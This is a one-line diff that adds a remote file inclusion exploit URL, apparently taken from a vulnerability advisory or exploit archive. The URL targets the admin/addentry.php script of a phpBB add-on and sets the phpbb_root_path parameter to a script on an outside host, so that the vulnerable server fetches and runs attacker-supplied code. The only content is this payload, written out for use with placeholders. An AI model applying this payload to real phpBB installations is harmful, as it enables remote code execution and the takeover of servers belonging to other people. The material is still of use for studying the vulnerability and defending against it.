@@ -1,0 +1,1 @@
+http://www.example.com/[phpbb_path]/admin/addentry.php?phpbb_root_path=http://www.example.com/[badscript]?
